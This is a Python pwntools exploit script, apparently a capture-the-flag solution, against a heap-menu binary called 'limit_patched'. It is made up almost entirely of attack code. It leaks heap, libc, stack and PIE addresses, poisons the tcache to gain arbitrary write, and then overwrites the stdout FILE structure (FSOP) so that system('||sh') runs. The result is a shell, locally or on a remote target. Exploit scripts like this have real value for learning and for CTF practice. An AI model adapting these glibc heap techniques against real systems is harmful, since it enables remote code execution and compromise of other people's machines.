#!/usr/bin/env python3 

from pwn import *

exe = context.binary = ELF("./limit_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
# context.log_level = 'debug'
gs = '''
set max-visualize-chunk-size 100
continue
brva 0x1585
# b *_IO_do
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']
def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)

    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()

def malloc(idx, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(idx))
    p.sendlineafter(b"Size: ", str(size))


def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(idx))

def puts(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(idx))

def read(idx, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(idx))
    p.sendafter(b"Data:", data)


# heap leak:
malloc(0, 0x18)
free(0)
malloc(0, 0x18)
puts(0)
p.recvuntil(b"Data: ")
leak_data = u64(p.recvline()[:-1].ljust(8, b"\00"))
heap_base = leak_data << 12
for i in range(7):
    malloc(i, 0xf8)

malloc(7, 0xf8)
malloc(8, 0xe8)
malloc(9, 0xf8)
malloc(10, 0xe8)
malloc(11, 0x18)

for i in range(7):  
    free(i)
# leak libc:
free(7)
malloc(0, 0x18)
puts(0)
p.recvuntil(b"Data: ")
leak_data = u64(p.recvline()[:-1].ljust(8, b"\00"))
libc_base = leak_data - (libc.sym.main_arena+336)
libc.address = libc_base
log.success(f"leaking libc: {hex(libc_base)}")
log.success(f"leaking heap: {hex(heap_base)}")
payload = flat(
    b"A"*0xe0,
    p64(0x1a0),
)
read(8, payload) ### overlap this chunk
malloc(1, 0x18)
malloc(0, 0x28)
payload1 = flat(
    p64(0),
    p64(0x1a1),
    p64(heap_base + 0x9d0)*2,
)
payload2 = flat(
    p64(heap_base + 0xa00)*2,
)
read(0, payload1)
read(1, payload2)
input()
free(9)
free(10)
free(8)
malloc(12, 0xd8)
payload = flat(
    b"\x00"*0xb0,
    # p64(0x90),
    # p64(0xe0),
    p64((heap_base+0x100) ^ ((heap_base) >> 12)),
)
read(12, payload)
# input()
malloc(13, 0xe8)
malloc(14, 0xe8)
read(14, p64(libc.sym.__libc_argv))
malloc(15, 0xf8)
puts(14)
p.recvuntil(b"Data: ")
leak_stack = u64(p.recv(6).ljust(8, b"\00")) ^ (libc.sym.__libc_argv >> 12)
log.info(f"leaking stack: {hex(leak_stack)}")

read(14, p64(leak_stack - 0xd8))
malloc(15, 0xf8)
puts(14)
p.recvuntil(b"Data: ")
leak_pie = u64(p.recv(6).ljust(8, b"\00")) ^ (leak_stack >> 12)
pie_base = leak_pie - 0x3d80
exe.address = pie_base
log.info(f"leaking binary: {hex(leak_pie)}")

read(14, p64(exe.sym.chunks+0x70))
malloc(15, 0xf8)
read(15, p64(libc.sym._IO_2_1_stdout_))

payload = flat(
    p8(0)*0x20,
    p64(heap_base + 0xab8),
    p8(0)*0x38,
    p64(libc.sym.system),
)
read(13, payload)
# fsop:
input()
binsh = u32(b"||sh") << 32
flags = p64(0xfbad2484 | binsh)
payload = flat(
    flags,
    p64(0)*16,
    p64(heap_base+0x100),
    p64(0)*2,
    p64(heap_base+0xa00),   
    p64(0)*6,
    p64(libc.address+0x202390-0x38),
)
print(len(payload))
read(14, payload)

p.interactive()

